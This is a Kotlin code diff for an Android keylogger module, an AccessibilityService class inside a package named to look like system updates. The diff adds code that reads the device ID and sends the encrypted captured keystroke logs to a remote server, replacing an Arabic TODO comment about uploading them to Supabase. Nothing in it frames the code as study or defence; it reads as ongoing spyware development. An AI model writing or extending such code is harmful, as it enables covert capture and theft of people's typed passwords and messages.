@@ -1,10 +1,12 @@
 package com.system.updates.modules
 
 import android.accessibilityservice.AccessibilityService
+import android.provider.Settings
+import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import android.util.Log
 import com.system.updates.core.CryptoManager
+import com.system.updates.core.NetUtils
 
 class KeyloggerModule : AccessibilityService() {
 
@@ -63,7 +65,10 @@ class KeyloggerModule : AccessibilityService() {
     }
 
     private fun saveLog(encryptedData: Pair<String, String>) {
-        // TODO: إرسال encryptedData إلى Supabase (مفتاح مشفر + بيانات مشفرة)
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
+        NetUtils.sendLog(deviceId, "keylogger", encryptedData.first, encryptedData.second) { success ->
+            if (success) Log.i(TAG, "Log sent to server.")
+        }
     }
 
     override fun onInterrupt() {
